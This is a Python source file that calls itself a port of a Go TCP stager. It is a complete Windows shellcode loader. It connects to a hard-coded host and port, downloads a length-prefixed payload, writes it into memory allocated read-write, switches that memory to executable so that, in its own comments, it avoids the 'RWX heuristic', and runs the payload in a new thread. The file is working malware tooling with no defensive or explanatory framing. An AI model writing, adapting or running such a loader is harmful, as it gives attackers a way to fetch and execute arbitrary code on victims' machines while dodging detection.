# loader.py — Python 3 port of the Go TCP stager
import ctypes
import socket
import struct
from ctypes import wintypes

# --- Win32 API bindings via ctypes (like syscall.MustLoadDLL in Go) ---
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.restype = ctypes.c_void_p
VirtualAlloc.argtypes = [
    ctypes.c_void_p,   # lpAddress
    ctypes.c_size_t,   # dwSize
    wintypes.DWORD,    # flAllocationType
    wintypes.DWORD,    # flProtect
]

# 🔑 NEW: VirtualProtect for the RW → RX flip
VirtualProtect = kernel32.VirtualProtect
VirtualProtect.restype = wintypes.BOOL
VirtualProtect.argtypes = [
    ctypes.c_void_p,                # lpAddress
    ctypes.c_size_t,                # dwSize
    wintypes.DWORD,                 # flNewProtect
    ctypes.POINTER(wintypes.DWORD), # lpflOldProtect
]

RtlMoveMemory = kernel32.RtlMoveMemory
RtlMoveMemory.restype = None
RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]

CreateThread = kernel32.CreateThread
CreateThread.restype = wintypes.HANDLE
CreateThread.argtypes = [
    ctypes.c_void_p,   # lpThreadAttributes
    ctypes.c_size_t,   # dwStackSize
    ctypes.c_void_p,   # lpStartAddress
    ctypes.c_void_p,   # lpParameter
    wintypes.DWORD,    # dwCreationFlags
    ctypes.c_void_p,   # lpThreadId
]

WaitForSingleObject = kernel32.WaitForSingleObject
WaitForSingleObject.restype = wintypes.DWORD
WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]

CloseHandle = kernel32.CloseHandle
CloseHandle.restype = wintypes.BOOL
CloseHandle.argtypes = [wintypes.HANDLE]

# --- Constants (same as Go) ---
STAGE_HOST = "192.168.1.9"
STAGE_PORT = 8887
CONNECT_TO = 30.0
MAX_STAGE_SIZE = 256 << 20

MEM_COMMIT_RESERVE     = 0x3000
PAGE_READWRITE         = 0x04   # 🔑 allocate as RW first
PAGE_EXECUTE_READ      = 0x20   # 🔑 then flip to RX
INFINITE               = 0xFFFFFFFF


# --- Staging protocol (same wire format as Go) ---
def fetch_stage(host, port):
    """Connect, read 4-byte LE length, then read that many bytes."""
    with socket.create_connection((host, port), timeout=CONNECT_TO) as conn:
        conn.settimeout(60.0)

        size_buf = _recv_exact(conn, 4)
        (size,) = struct.unpack("<I", size_buf)

        if size == 0 or size > MAX_STAGE_SIZE:
            raise ValueError(f"invalid stage size: {size}")

        payload = _recv_exact(conn, size)
        return payload


def _recv_exact(conn, n):
    """Equivalent of Go's io.ReadFull on a socket."""
    chunks = []
    remaining = n
    while remaining > 0:
        chunk = conn.recv(remaining)
        if not chunk:
            raise ConnectionError(f"connection closed after {n - remaining}/{n} bytes")
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


# --- Executing the shellcode ---
def run_stage():
    try:
        shellcode = fetch_stage(STAGE_HOST, STAGE_PORT)
    except Exception:
        return

    if len(shellcode) < 64:
        return

    size = len(shellcode)

    # 1️⃣ Allocate as RW (NOT RWX — avoids the RWX heuristic)
    addr = VirtualAlloc(
        None,
        size,
        MEM_COMMIT_RESERVE,
        PAGE_READWRITE,
    )
    if not addr:
        return

    # 2️⃣ Copy shellcode into RW memory
    buf = ctypes.create_string_buffer(shellcode, size)
    RtlMoveMemory(addr, ctypes.cast(buf, ctypes.c_void_p), size)

    # 3️⃣ Flip RW → RX (now executable, but no longer writable)
    old_protect = wintypes.DWORD(0)
    ok = VirtualProtect(
        ctypes.c_void_p(addr),
        size,
        PAGE_EXECUTE_READ,
        ctypes.byref(old_protect),
    )
    if not ok:
        return

    # 4️⃣ Create a Windows thread that starts executing at 'addr'
    thread_id = wintypes.DWORD(0)
    h_thread = CreateThread(
        None,
        0,
        ctypes.cast(addr, ctypes.c_void_p),
        None,
        0,
        ctypes.byref(thread_id),
    )
    if not h_thread:
        return

    # Block this Python thread on the shellcode thread so the process stays alive
    WaitForSingleObject(h_thread, INFINITE)
    CloseHandle(h_thread)




def start_loader():
    run_stage()


if __name__ == "__main__":
    start_loader()